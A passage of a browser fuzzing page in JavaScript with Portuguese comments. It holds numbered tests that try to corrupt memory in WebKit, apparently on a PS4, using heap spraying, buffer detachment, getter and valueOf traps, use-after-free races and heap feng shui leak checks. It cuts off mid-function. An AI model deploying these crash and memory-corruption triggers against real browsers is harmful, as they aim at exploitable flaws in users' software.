                    ], {type:'text/javascript'})));
                    
                    // Transfere a posse do bitmap
                    w.postMessage(bmp, [bmp]);
                    
                    // Tenta acessar o bitmap transferido (Neutered) na thread principal
                    // O WebKit deve lan√ßar erro, mas se falhar no check...
                    try {
                        ctx.drawImage(bmp, 0, 0);
                    } catch(e) {}
                    
                    // Mata o worker agressivamente
                    w.terminate();
                }
                sprayHeap();
            });
        }

        // --- TESTE 116: Nested Worker ObjectURL Storm ---
        // Alvo: Resource Loader.
        // Criamos Workers dentro de Workers (Nested), cada um carregando um Blob URL.
        // Revogamos a URL raiz enquanto a cadeia carrega.
        function runTest116() {
            log("Iniciando Test 116: Worker Storm...");
            
            let deepWorkerCode = `
                self.onmessage = function() {
                    // Tenta alocar mem√≥ria massiva
                    let a = new Uint8Array(1024*1024*5);
                    postMessage('ok');
                }
            `;
            let deepBlob = new Blob([deepWorkerCode], {type:'text/javascript'});
            let deepUrl = URL.createObjectURL(deepBlob);
            
            let rootWorkerCode = `
                let u = '${deepUrl}';
                let w = new Worker(u);
                w.onmessage = function() { postMessage('child_ok'); }
                // Spamma mensagens
                setInterval(() => w.postMessage('ping'), 1);
            `;
            
            let rootBlob = new Blob([rootWorkerCode], {type:'text/javascript'});
            let rootUrl = URL.createObjectURL(rootBlob);
            
            log("Iniciando cadeia de Workers...");
            let master = new Worker(rootUrl);
            
            setTimeout(() => {
                log("REVOGANDO URLs e matando master...");
                // Revoga as URLs enquanto os workers tentam carregar/comunicar
                URL.revokeObjectURL(deepUrl);
                URL.revokeObjectURL(rootUrl);
                
                // Mata o pai, deixando filhos √≥rf√£os tentando IO
                master.terminate();
                sprayHeap();
            }, 100);
        }

        // --- TESTE 117: FontFaceSet Recursive Clear ---
        // Alvo: Style Resolver.
        // For√ßamos o rec√°lculo de estilo (via offsetHeight) dentro de um evento
        // de carregamento de fonte, onde limpamos as fontes.
        function runTest117() {
            log("Iniciando Test 117: Font Clear Recursive...");
            
            let f = new FontFace('CrashFont', 'url(data:font/woff;base64,AAAA)');
            document.fonts.add(f);
            
            let div = document.createElement('div');
            div.style.fontFamily = 'CrashFont';
            div.innerText = "LAYOUT";
            document.body.appendChild(div);
            
            f.load().then(() => {
                log("Fonte carregada (inesperado).");
            }).catch(() => {
                // Fonte falhou (esperado). O callback roda.
                log("Callback de erro. Limpando fontes e for√ßando layout...");
                
                // 1. Limpa o set de fontes
                document.fonts.clear();
                
                // 2. Remove o elemento que usa a fonte
                div.remove();
                sprayHeap();
                
                // 3. O GOLPE: For√ßa layout global.
                // O renderizador tenta buscar a fonte 'CrashFont' para o elemento removido?
                try {
                    document.body.offsetHeight; 
                } catch(e) {}
            });
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS (VERIFICA√á√ÉO DE INTEGRIDADE)
        // ==========================================

        // --- TESTE 118: TypedArray Setter Detach Trap ---
        // L√≥gica: arr[index] = val. O 'index' √© convertido para n√∫mero.
        // Se a convers√£o (valueOf) desconectar o buffer, onde o valor √© escrito?
        function runTest118() {
            log("Iniciando Test 118: Setter Trap...");
            
            let ab = new ArrayBuffer(1024);
            let ta = new Uint8Array(ab);
            
            let indexTrap = {
                valueOf: function() {
                    log("Trap ativada! Detachando buffer...");
                    // Transfere buffer para worker (esvazia)
                    try {
                        let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                        w.postMessage(ab, [ab]);
                    } catch(e) {}
                    
                    sprayHeap();
                    return 0; // Retorna √≠ndice 0
                }
            };
            
            try {
                // O WebKit deve verificar 'ta.length' DEPOIS de converter 'indexTrap'.
                // Se verificar ANTES, ele escreve em mem√≥ria liberada.
                ta[indexTrap] = 0xFF;
                
                if (ta.length === 0) {
                    log("Buffer detachado corretamente. Escrita bloqueada.", "success");
                } else {
                    log("ALERTA: Buffer n√£o detachado! Falha no teste.", "info");
                }
            } catch(e) {
                // Se der erro de "Detached Buffer", √© seguro.
                log("Erro esperado (Safe): " + e.message, "success");
            }
        }

        // --- TESTE 119: RegExp Sticky 'lastIndex' Overflow ---
        // L√≥gica: RegExp com flag 'y' usa lastIndex. Se lastIndex for maior que a string,
        // mas um getter manipular a string para ser maior durante a checagem...
        function runTest119() {
            log("Iniciando Test 119: RegExp Overflow...");
            
            let re = /A/y;
            let str = "AAA";
            
            // Define lastIndex malicioso
            re.lastIndex = {
                valueOf: function() {
                    log("RegExp leu lastIndex. Reduzindo string...");
                    str = "A"; // Reduz a string
                    return 2; // Retorna √≠ndice que era v√°lido, mas agora √© OOB
                }
            };
            
            try {
                let res = re.exec(str);
                // Se leu mem√≥ria fora da string, pode vir lixo ou crash
                if (res === null) {
                    log("RegExp retornou null (Safe).", "success");
                } else {
                    log(`ALERTA: Leitura inesperada! ${res[0]}`, "alert");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 120: JSON.parse Reviver Confusion ---
        // L√≥gica: O 'reviver' do JSON.parse roda para cada chave.
        // Se no meio do parse n√≥s deletarmos propriedades do objeto que est√° sendo constru√≠do...
        function runTest120() {
            log("Iniciando Test 120: JSON Reviver...");
            
            let json = '{"a": 1, "b": 2, "c": 3}';
            let parsed = JSON.parse(json, function(k, v) {
                if (k === "a") {
                    log("Reviver em 'a'. Deletando 'c'...");
                    // 'this' √© o objeto sendo constru√≠do
                    delete this.c; 
                    sprayHeap();
                }
                if (k === "c") {
                    // Se o reviver rodar para 'c', significa que o loop C++
                    // usou um iterador ou √≠ndice antigo e n√£o viu que 'c' sumiu.
                    // Isso pode retornar valor de mem√≥ria n√£o inicializada.
                    if (v === 3) {
                         log("Reviver acessou 'c' (Normal se ordenado).", "success");
                    } else {
                         log(`ALERTA: Valor corrompido em 'c': ${v}`, "alert");
                    }
                }
                return v;
            });
        }
// --- TESTE 121: OffscreenCanvas Commit Race ---
        // L√≥gica: 'commit()' empurra pixels para a GPU. Se transferirmos o canvas
        // para um worker e chamarmos commit() simultaneamente na thread principal
        // (via refer√™ncia retida), podemos crashar o driver de v√≠deo.
        function runTest121() {
            log("Iniciando Test 121: GPU Commit Race...");
            
            if (!window.OffscreenCanvas) { log("OffscreenCanvas n√£o suportado."); return; }

            let canvas = new OffscreenCanvas(256, 256);
            let ctx = canvas.getContext('2d');
            ctx.fillStyle = 'blue';
            ctx.fillRect(0,0,256,256);

            // Worker assassino
            let w = new Worker(URL.createObjectURL(new Blob([
                "self.onmessage = function(e) { let c = e.data; setInterval(() => { try { c.getContext('2d').fillRect(0,0,1,1); } catch(e){} }, 0); }"
            ], {type:'text/javascript'})));

            // Tenta criar uma condi√ß√£o de corrida no ponteiro do Backing Store
            let interval = setInterval(() => {
                try {
                    // Alguns navegadores permitem commit manual ou implicitamente via bitmap
                    let bmp = canvas.transferToImageBitmap();
                    bmp.close();
                } catch(e) {}
            }, 0);

            // Transfere a posse
            log("Transferindo Canvas...");
            w.postMessage(canvas, [canvas]);
            
            // Bombardeio de mem√≥ria
            sprayHeap();

            setTimeout(() => {
                clearInterval(interval);
                w.terminate();
                log("Teste 121 finalizado.");
            }, 1000);
        }

        // --- TESTE 122: ShadowDOM Slot Assignment Crash ---
        // L√≥gica: O mecanismo de <slot> atualiza a √°rvore de renderiza√ß√£o.
        // Se atribuirmos um n√≥ a um slot, e no evento de inser√ß√£o movermos
        // esse n√≥ para DENTRO de si mesmo (ciclo) ou removermos o ShadowRoot...
        function runTest122() {
            log("Iniciando Test 122: Shadow Slot Crash...");
            
            if (!document.body.attachShadow) { log("ShadowDOM ausente."); return; }

            let host = document.createElement('div');
            let root = host.attachShadow({mode: 'open'});
            let slot = document.createElement('slot');
            root.appendChild(slot);
            document.body.appendChild(host);

            let child = document.createElement('div');
            
            // Armadilha de ciclo de vida
            slot.addEventListener('slotchange', () => {
                log("Slot Change! Destruindo ShadowRoot...");
                // Remove o host do documento enquanto a engine calcula a distribui√ß√£o
                host.remove();
                
                // Tenta corromper a mem√≥ria do ShadowRoot
                root = null; 
                sprayHeap();
                
                // For√ßa layout no filho √≥rf√£o
                child.innerText = "Check";
            });

            log("Atribuindo filho ao slot...");
            host.appendChild(child);
        }

        // --- TESTE 123: AudioNode Channel Splitter UAF ---
        // L√≥gica: ChannelSplitter divide canais de √°udio.
        // Se mudarmos a contagem de canais (channelCount) violentamente
        // enquanto o n√≥ est√° conectado e processando...
        function runTest123() {
            log("Iniciando Test 123: Audio Channel Split...");
            
            try {
                let ctx = new (window.AudioContext || window.webkitAudioContext)();
                let splitter = ctx.createChannelSplitter(6);
                let merger = ctx.createChannelMerger(6);
                
                splitter.connect(merger);
                merger.connect(ctx.destination);
                
                log("Stressando canais de √°udio...");
                
                let i = 0;
                let loop = setInterval(() => {
                    i++;
                    // Muda drasticamente o n√∫mero de canais
                    // Isso for√ßa realoca√ß√£o de buffers internos em C++
                    try {
                        splitter.channelCount = (i % 2 === 0) ? 2 : 6;
                    } catch(e) {}
                    
                    if (i > 100) {
                        clearInterval(loop);
                        ctx.close();
                        log("Fim do stress de √°udio.");
                    }
                }, 1); // 1ms = muito r√°pido
                
                // Spray no meio do processo
                setTimeout(sprayHeap, 50);
                
            } catch(e) { log("Erro Audio: " + e); }
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS (Info Leak)
        // ==========================================

        // --- TESTE 124: 0xFF Heap Feng Shui Leak ---
        // L√≥gica: Baseado no seu JSON, objeto 'KhH9HpubH' tem tamanho 0xFF (255).
        // Alocamos buffers desse tamanho, liberamos, e alocamos um novo.
        // Verificamos se o novo buffer vem "sujo" (n√£o zerado).
        function runTest124() {
            log("Iniciando Test 124: Feng Shui 0xFF...");
            
            let holes = [];
            // 1. Enche a heap com dados conhecidos (0xAA)
            for(let i=0; i<1000; i++) {
                let b = new Uint8Array(255); // Alvo: 0xFF
                b.fill(0xAA);
                holes.push(b);
            }
            
            // 2. Libera 50% para criar buracos
            log("Criando buracos...");
            for(let i=0; i<holes.length; i+=2) {
                holes[i] = null;
            }
            
            // 3. Tenta reocupar com buffers "seguros"
            // Se o sistema de seguran√ßa falhar, ele n√£o vai zerar a mem√≥ria
            let verification = [];
            for(let i=0; i<500; i++) {
                let v = new Uint8Array(255);
                // N√ÉO PREENCHEMOS. Confiamos que o JS inicialize com 0.
                verification.push(v);
            }
            
            // 4. Verifica
            let leak = false;
            for(let v of verification) {
                if (v[0] !== 0) {
                    log(`ALERTA: Mem√≥ria suja detectada! Byte: 0x${v[0].toString(16)}`, "alert");
                    leak = true;
                    break;
                }
            }
            if (!leak) log("Heap limpo (Safe).", "success");
        }

        // --- TESTE 125: DataView Constructor Detach ---
        // L√≥gica: Construtor DataView(buffer, offset, length).
        // Se 'offset' ou 'length' tiverem getters que desconectam o buffer...
        function runTest125() {
            log("Iniciando Test 125: DataView Detach...");
            
            let ab = new ArrayBuffer(1024);
            new Uint8Array(ab).fill(0xBB); // Marcador
            
            let params = {
                valueOf: function() {
                    log("Trap no construtor! Detachando...");
                    try {
                        let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                        w.postMessage(ab, [ab]); // Mata o buffer
                    } catch(e) {}
                    sprayHeap();
                    return 0;
                }
            };
            
            try {
                // Tenta criar DataView em buffer morto
                let dv = new DataView(ab, params, 10);
                
                // Se dv for criado, ele aponta para onde?
                if (dv.byteLength === 0) {
                    log("DataView seguro (vazio).", "success");
                } else {
                    // Tenta ler
                    let val = dv.getUint8(0);
                    log(`ALERTA: DataView l√™ mem√≥ria morta! Val: 0x${val.toString(16)}`, "alert");
                }
            } catch(e) {
                log("Erro esperado: " + e.message, "success");
            }
        }

        // --- TESTE 126: Large String Flattening Leak ---
        // L√≥gica: Strings grandes concatendas s√£o "Ropes".
        // Ao acessar, o navegador "Achata" (Flatten) a string num buffer cont√≠guo.
        // Se falhar a aloca√ß√£o ou GC rodar no meio, pode vazar dados vizinhos.
        function runTest126() {
            log("Iniciando Test 126: String Flatten...");
            
            try {
                // Cria uma "Rope" (Corda) gigante
                let s1 = "A".repeat(1024*1024); 
                let s2 = "B".repeat(1024*1024);
                let rope = s1 + s2; // Ainda n√£o alocada contiguamente
                
                // Tenta achatar acessando charAt numa posi√ß√£o profunda
                // Isso for√ßa malloc() interno
                let char = rope.charAt(1024*1024 + 5); 
                
                // Verifica se o caractere √© o esperado ('B')
                if (char === 'B') {
                    log("String √≠ntegra.", "success");
                } else {
                    log(`ALERTA: String corrompida! Lido: '${char}'`, "alert");
                }
            } catch(e) {
                log("Erro (OOM?): " + e.message);
            }
        }
// ==========================================
        // GRUPO 1: CRASH VECTORS
        // ==========================================

        // --- TESTE 127: WebGL Texture Upload Race ---
        // Alvo: Driver da GPU do PS4.
        // L√≥gica: Criamos um contexto WebGL, enviamos uma textura GIGANTE.
        // Enquanto o upload acontece, destru√≠mos o canvas e o contexto.
        // O driver da GPU pode tentar ler mem√≥ria liberada.
        function runTest127() {
            log("Iniciando Test 127: GPU Upload Race...");
            
            let canvas = document.createElement('canvas');
            let gl = canvas.getContext('webgl');
            
            if (!gl) { log("WebGL n√£o suportado."); return; }
            
            let tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            
            // Dados massivos (16MB de textura)
            let data = new Uint8Array(2048 * 2048 * 4).fill(0xFF);
            
            log("Iniciando upload de textura massiva...");
            
            // Inicia upload
            // texImage2D pode ser s√≠ncrono ou ass√≠ncrono dependendo da implementa√ß√£o do driver
            // Tentamos interferir logo ap√≥s a chamada
            try {
                // Agenda a destrui√ß√£o para "agora"
                setTimeout(() => {
                    log("Destruindo contexto WebGL...");
                    let ext = gl.getExtension('WEBGL_lose_context');
                    if (ext) ext.loseContext();
                    canvas.width = 0; // Zera
                    gl = null;
                    sprayHeap();
                }, 0);

                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
                
                // For√ßa comandos para a GPU
                gl.finish(); 
                
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 128: Array.splice() Resize Trap ---
        // Alvo: JavaScriptCore (Motor JS).
        // L√≥gica: 'splice' move elementos. Se usarmos um objeto com Getter dentro do array,
        // e esse getter diminuir o tamanho do array NO MEIO do splice,
        // o WebKit pode escrever fora dos limites (Heap Overflow).
        function runTest128() {
            log("Iniciando Test 128: Array Splice Trap...");
            
            let arr = [];
            // Preenche array
            for(let i=0; i<100; i++) arr[i] = {};
            
            // Define um getter malicioso na posi√ß√£o 50
            Object.defineProperty(arr, '50', {
                get: function() {
                    log("Getter disparado durante Splice! Reduzindo array...");
                    arr.length = 10; // Encolhe drasticamente
                    sprayHeap();
                    return "trap";
                }
            });

            try {
                // Remove elementos a partir do 40.
                // O motor vai ler 40, 41... at√© chegar no 50.
                // No 50, o array encolhe. O loop continua tentando ler/escrever at√© 100?
                log("Executando splice...");
                arr.splice(40, 10);
                log("Splice finalizado.");
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 129: CSS FontFace Garbage Collection Thrash ---
        // Alvo: Motor de Layout e Renderiza√ß√£o de Texto.
        // L√≥gica: Carregar fontes customizadas envolve chamadas ao sistema operacional.
        // Se adicionarmos e removermos a fonte rapidamente enquanto for√ßamos layout de texto.
        function runTest129() {
            log("Iniciando Test 129: Font GC Thrash...");
            
            let fontName = "CrashFont" + Math.random();
            let f = new FontFace(fontName, 'url(data:font/woff;base64,AAAA)');
            
            let div = document.createElement('div');
            div.style.fontFamily = fontName;
            div.innerText = "CRASH ME HARDER";
            document.body.appendChild(div);
            
            // Adiciona e remove em loop apertado
            let count = 0;
            let i = setInterval(() => {
                count++;
                if(count > 20) clearInterval(i);
                
                document.fonts.add(f);
                // For√ßa layout (trigger de rasteriza√ß√£o)
                div.innerText = "Frame " + count;
                div.offsetWidth;
                
                document.fonts.delete(f);
                
                // Spray no meio
                if(count % 5 === 0) sprayHeap();
            }, 5);
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS (INTEGRITY CHECK)
        // ==========================================

        // --- TESTE 130: RegExp String Replacement OOB Read ---
        // Alvo: Manipula√ß√£o de Strings.
        // L√≥gica: String.replace chama uma fun√ß√£o para cada match.
        // Se a fun√ß√£o modificar a vari√°vel da string original (encolhendo-a),
        // o pr√≥ximo match pode ler mem√≥ria fora dos limites da nova string.
        function runTest130() {
            log("Iniciando Test 130: RegExp OOB...");
            
            // String alvo
            var str = "A".repeat(1000) + "B".repeat(1000);
            
            // Regex global
            var re = /A/g;
            
            // Executa replace
            str.replace(re, function(match, offset) {
                if (offset === 500) {
                    log("Trap no offset 500. Encolhendo string...");
                    // Substitui a vari√°vel 'str' por uma menor
                    str = "SMALL"; 
                    sprayHeap();
                }
                
                // Se o WebKit passar o ponteiro da string antiga para os pr√≥ximos matches...
                return "X";
            });
            
            // Verifica√ß√£o: A string final cont√©m algo que n√£o deveria?
            // Se houve OOB read, talvez tenhamos lixo de mem√≥ria na sa√≠da
            log("Replace finalizado. Verificando integridade...");
            if (str.length < 1000 && str.indexOf("SMALL") !== -1) {
                log("Comportamento esperado (Safe).", "success");
            } else {
                log("Comportamento an√¥malo detectado!", "alert");
            }
        }

        // --- TESTE 131: Blob FileReader Revocation Leak ---
        // Alvo: File API / Blob System.
        // L√≥gica: Ler um Blob e revogar sua URL no meio da leitura.
        // O FileReader deve falhar ou retornar erro. Se retornar dados incorretos, √© leak.
        function runTest131() {
            log("Iniciando Test 131: Blob Revoke Leak...");
            
            // Dados conhecidos: "AAAAAAAA..."
            let u8 = new Uint8Array(1024 * 512);
            u8.fill(0x41);
            let blob = new Blob([u8]);
            let url = URL.createObjectURL(blob);
            
            let reader = new FileReader();
            
            reader.onload = function(e) {
                // Verifica o primeiro e ultimo byte
                let res = new Uint8Array(e.target.result);
                if (res[0] === 0x41 && res[res.length-1] === 0x41) {
                    log("Leitura √≠ntegra (Safe).", "success");
                } else {
                    log(`ALERTA: Dados corrompidos! 0x${res[0].toString(16)}`, "alert");
                }
            };
            
            reader.onerror = function() {
                log("Erro de leitura (Safe, bloqueado).", "success");
            };
            
            // Inicia leitura
            reader.readAsArrayBuffer(blob);
            
            // Destroi a fonte imediatamente
            log("Revogando URL...");
            URL.revokeObjectURL(url);
            blob = null;
            sprayHeap();
        }

        // --- TESTE 132: TypedArray Species Detach Leak ---
        // Alvo: TypedArray Constructor.
        // L√≥gica: 'slice' usa 'Symbol.species' para criar o novo array.
        // Se o construtor customizado destruir o buffer original...
        function runTest132() {
            log("Iniciando Test 132: Species Detach...");
            
            class MyArray extends Uint8Array {
                static get [Symbol.species]() {
                    return function(len) {
                        log("Species Constructor! Detachando buffer pai...");
                        // Aqui temos acesso ao contexto?
                        // Simulamos detach global transferindo um buffer global
                        if (window.targetBuffer) {
                            try {
                                let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                                w.postMessage(window.targetBuffer, [window.targetBuffer]);
                            } catch(e){}
                        }
                        sprayHeap();
                        return new Uint8Array(len);
                    }
                }
            }
            
            let ab = new ArrayBuffer(100);
            window.targetBuffer = ab; // Salva ref global
            new Uint8Array(ab).fill(0x42);
            
            let arr = new MyArray(ab);
            
            try {
                // 'slice' chama o construtor Species.
                // O WebKit copia os dados do array velho para o novo.
                // Se o array velho for detachado NO MEIO da c√≥pia...
                let copy = arr.slice(0, 50);
                
                if (copy[0] === 0x42) {
                    log("C√≥pia normal (Safe).", "success");
                } else {
                    log(`ALERTA: C√≥pia inv√°lida! Byte: 0x${copy[0].toString(16)}`, "alert");
                }
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
  // ==========================================
        // GRUPO 1: CRASH VECTORS
        // ==========================================

        // --- TESTE 133: Array.from() Resize Trap ---
        // Alvo: Cria√ß√£o de Arrays.
        // L√≥gica: Array.from aceita um iter√°vel e uma fun√ß√£o map.
        // Se a fun√ß√£o map alterar o tamanho do array fonte durante a itera√ß√£o,
        // o WebKit pode escrever fora dos limites do buffer de destino pr√©-alocado.
        function runTest133() {
            log("Iniciando Test 133: Array.from Race...");
            
            let arr = [1, 2, 3, 4, 5];
            // Proxy para detectar acesso ao length
            let p = new Proxy(arr, {
                get: function(target, prop) {
                    if (prop === 'length') return 1000; // Mente sobre o tamanho
                    return target[prop];
                }
            });
            
            try {
                // Array.from vai alocar buffer para 1000 itens.
                // Mas 'arr' s√≥ tem 5. A fun√ß√£o map roda.
                // No meio, explodimos a mem√≥ria.
                Array.from(p, function(v, k) {
                    if (k === 2) {
                        log("Map function rodando. Spraying...");
                        sprayHeap(); 
                        // Tenta retornar algo que confunda o tipo
                        return { toString: () => { arr.length = 0; return "crash"; } };
                    }
                    return v;
                });
                log("Array.from concluiu.");
            } catch(e) { log("Erro: " + e.message); }
        }

        // --- TESTE 134: WebGL Renderbuffer Detach UAF ---
        // Alvo: Gerenciamento de Mem√≥ria GPU.
        // L√≥gica: Anexar um Renderbuffer a um Framebuffer, deletar o Renderbuffer,
        // e tentar desenhar. O WebKit deve limpar a refer√™ncia, mas drivers antigos falham.
        function runTest134() {
            log("Iniciando Test 134: WebGL Renderbuffer...");
            
            let c = document.createElement('canvas');
            let gl = c.getContext('webgl');
            if(!gl) { log("WebGL ausente."); return; }
            
            let fb = gl.createFramebuffer();
            let rb = gl.createRenderbuffer();
            
            gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
            gl.bindRenderbuffer(gl.RENDERBUFFER, rb);
            
            // Aloca armazenamento
            gl.renderbufferStorage(gl.RENDERBUFFER, gl.RGBA4, 1024, 1024);
            
            // Anexa
            gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.RENDERBUFFER, rb);
            
            log("Deletando Renderbuffer e desenhando...");
            
            // Deleta o recurso
            gl.deleteRenderbuffer(rb);
            sprayHeap();
            
            // Tenta limpar o framebuffer (que aponta para RB deletado)
            try {
                gl.clearColor(1, 0, 0, 1);
                gl.clear(gl.COLOR_BUFFER_BIT);
                log("Clear comando enviado.");
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 135: ResizeObserver Infinite Loop Crash ---
        // Alvo: Engine de Layout.
        // L√≥gica: ResizeObserver dispara quando o tamanho muda.
        // Se mudarmos o tamanho DENTRO do callback, criamos um loop.
        // Se destruirmos o elemento no meio do loop, causamos confus√£o na lista de observers.
        function runTest135() {
            log("Iniciando Test 135: Resize Loop...");
            
            let div = document.createElement('div');
            div.style.width = "100px";
            div.style.height = "100px";
            div.style.background = "red";
            document.body.appendChild(div);
            
            let count = 0;
            let ro = new ResizeObserver(() => {
                count++;
                if (count > 50) {
                    log("Loop detectado. Destruindo elemento...");
                    div.remove();
                    ro.disconnect(); // Tenta desconectar tarde demais
                    sprayHeap();
                    return;
                }
                
                // Muda tamanho para disparar novamente
                div.style.width = (100 + count) + "px";
                
                // Tenta acessar geometria durante o c√°lculo
                let h = div.offsetHeight;
            });
            
            ro.observe(div);
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS (INTEGRITY)
        // ==========================================

        // --- TESTE 136: String.localeCompare() Side-Effect ---
        // L√≥gica: 'localeCompare' √© complexo. Se passarmos um objeto com 'toString'
        // que modifica a string original durante a compara√ß√£o...
        function runTest136() {
            log("Iniciando Test 136: LocaleCompare...");
            
            let s1 = "AAAA";
            let s2 = {
                toString: function() {
                    log("toString disparado! Mudando s1...");
                    s1 = "BB"; // Muda a vari√°vel global (n√£o a string na stack C++)
                    // Mas se o motor JS otimizar o acesso, pode haver confus√£o
                    sprayHeap();
                    return "B";
                }
            };
            
            try {
                let res = s1.localeCompare(s2);
                log("Compara√ß√£o feita: " + res, "success");
            } catch(e) {
                // Se crashar ou der erro estranho
                log("Erro: " + e, "alert");
            }
        }

        // --- TESTE 137: JSON.stringify() Buffer Detach ---
        // L√≥gica: Stringify em um objeto que cont√©m um TypedArray.
        // Um 'getter' irm√£o desconecta o buffer do TypedArray enquanto o JSON o l√™.
        function runTest137() {
            log("Iniciando Test 137: JSON Detach...");
            
            let ab = new ArrayBuffer(100);
            let u8 = new Uint8Array(ab);
            u8.fill(0x41);
            
            let obj = {
                a: u8,
                get b() {
                    log("Getter b: Detachando buffer de 'a'...");
                    try {
                        let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                        w.postMessage(ab, [ab]);
                    } catch(e) {}
                    return "detached";
                }
            };
            
            try {
                // A ordem das chaves importa. Se 'b' for lido antes de terminar a leitura de 'a'...
                // JSON.stringify serializa 'a' (inicia leitura), depois 'b' (detacha), depois termina 'a'?
                // Geralmente √© sequencial, mas...
                let s = JSON.stringify(obj);
                
                // Se 'a' foi serializado como null ou {} ou array de zeros, ok.
                // Se crashou, bingo.
                log("JSON Result: " + s.substring(0, 50), "success");
            } catch(e) {
                log("Erro no stringify: " + e.message);
            }
        }

        // --- TESTE 138: TextDecoder Stream Confusion ---
        // L√≥gica: TextDecoder com {stream: true}.
        // Decodificamos um peda√ßo, detachamos o buffer, e tentamos decodificar o resto.
        function runTest138() {
            log("Iniciando Test 138: TextDecoder...");
            
            let td = new TextDecoder();
            let ab = new ArrayBuffer(16);
            let u8 = new Uint8Array(ab);
            u8.fill(65); // 'A'
            
            try {
                // Decodifica parte 1
                let s1 = td.decode(u8, {stream: true});
                
                log("Parte 1 OK. Detachando...");
                try {
                    let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                    w.postMessage(ab, [ab]);
                } catch(e) {}
                sprayHeap();
                
                // Tenta finalizar decodifica√ß√£o com buffer morto
                // O TextDecoder mant√©m refer√™ncia interna?
                let s2 = td.decode(); // Flush
                
                if (s2 === "") {
                    log("Flush vazio (Safe).", "success");
                } else {
                    log(`ALERTA: Flush retornou dados fantasmas: ${s2}`, "alert");
                }
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
 // --- TESTE 140: ResizeObserver Depth-First Destruction ---
        // L√≥gica: ResizeObserver notifica mudan√ßas.
        // Se observarmos um elemento e, no callback, removermos o elemento e seus pais
        // recursivamente, for√ßando layout a cada passo...
        function runTest140() {
            log("Iniciando Test 140: Resize Depth Nuke...");
            
            let root = document.createElement('div');
            let parent = document.createElement('div');
            let target = document.createElement('div');
            
            target.style.width = "100px";
            target.style.height = "100px";
            
            parent.appendChild(target);
            root.appendChild(parent);
            document.body.appendChild(root);
            
            let ro = new ResizeObserver(() => {
                log("Observer disparado! Destruindo hierarquia...");
                
                // 1. Remove o alvo
                target.remove();
                
                // 2. Remove o pai
                parent.remove();
                
                // 3. Remove a raiz
                root.remove();
                
                sprayHeap();
                
                // 4. Tenta acessar layout do alvo morto
                try {
                    let w = target.offsetWidth;
                    log("Acesso layout p√≥s-morte: " + w);
                } catch(e) {}
            });
            
            ro.observe(target);
            
            // Trigger
            setTimeout(() => {
                target.style.width = "200px";
            }, 100);
        }

        // --- TESTE 141: TreeWalker Filter Parent Nuke ---
        // L√≥gica: O filtro do TreeWalker roda em C++.
        // Se, dentro do filtro, n√≥s removermos o PAI do n√≥ que est√° sendo testado...
        // O algoritmo de travessia precisa saber quem √© o pai para continuar (nextSibling).
        function runTest141() {
            log("Iniciando Test 141: TreeWalker Orphan...");
            
            let root = document.createElement('div');
            let parent = document.createElement('div');
            let child1 = document.createElement('div');
            let child2 = document.createElement('div');
            
            parent.appendChild(child1);
            parent.appendChild(child2);
            root.appendChild(parent);
            document.body.appendChild(root);
            
            const filter = {
                acceptNode: function(node) {
                    if (node === child1) {
                        log("Filtro em Child1. Removendo Parent...");
                        // Remove o pai da √°rvore
                        parent.remove();
                        sprayHeap();
                        return NodeFilter.FILTER_ACCEPT;
                    }
                    return NodeFilter.FILTER_SKIP;
                }
            };
            
            let tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, filter);
            
            try {
                log("Caminhando...");
                tw.nextNode(); // root
                tw.nextNode(); // parent
                
                // Deve ir para child1. O filtro roda. O pai morre.
                // O Walker tenta ir para child2 (irm√£o de child1).
                // Mas child1 n√£o tem mais pai conectado √† √°rvore.
                let res = tw.nextNode(); 
                
                log("Resultado Walker: " + (res ? res.tagName : "null"));
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS
        // ==========================================

        // --- TESTE 142: RegExp LastIndex Stale Read ---
        // L√≥gica: RegExp com 'g' ou 'y' usa lastIndex.
        // Se lastIndex for um objeto que altera a string alvo quando convertido para n√∫mero...
        // O motor regex pode ter cacheado o ponteiro da string antiga.
        function runTest142() {
            log("Iniciando Test 142: RegExp Stale String...");
            
            let str = "AAAAAA";
            let re = /A/g;
            
            re.lastIndex = {
                valueOf: function() {
                    log("lastIndex lido. Mudando string...");
                    str = "BBBBBB"; // Muda a refer√™ncia
                    sprayHeap();
                    return 0;
                }
            };
            
            try {
                // Executa. Se o motor cacheou o ponteiro de "AAAAAA", vai dar match.
                // Se usou a nova "BBBBBB", vai falhar.
                // Se leu lixo (ponteiro antigo liberado), comportamento indefinido.
                let match = re.exec(str);
                
                if (match && match[0] === "A") {
                    log("RegExp leu string ANTIGA (Safe/Logic Error).", "success");
                } else if (match && match[0] === "B") {
                    log("RegExp leu string NOVA (Safe).", "success");
                } else if (match === null) {
                    log("RegExp n√£o deu match (Safe).", "success");
                } else {
                    log(`ALERTA: Match bizarro: ${match[0]}`, "alert");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 143: Array.concat Species Confusion ---
        // L√≥gica: 'concat' usa Symbol.species para criar o array de resultado.
        // Se o construtor species retornar um Proxy que detecta a escrita...
        // ou retornar um array menor que o necess√°rio.
        function runTest143() {
            log("Iniciando Test 143: Concat Species...");
            
            let arr = [1, 2, 3];
            let trap = [];
            
            // Define species no array fonte
            arr.constructor = {
                [Symbol.species]: function(len) {
                    log(`Species chamado para len: ${len}`);
                    // Retorna um array menor que o esperado
                    return new Array(0); 
                }
            };
            
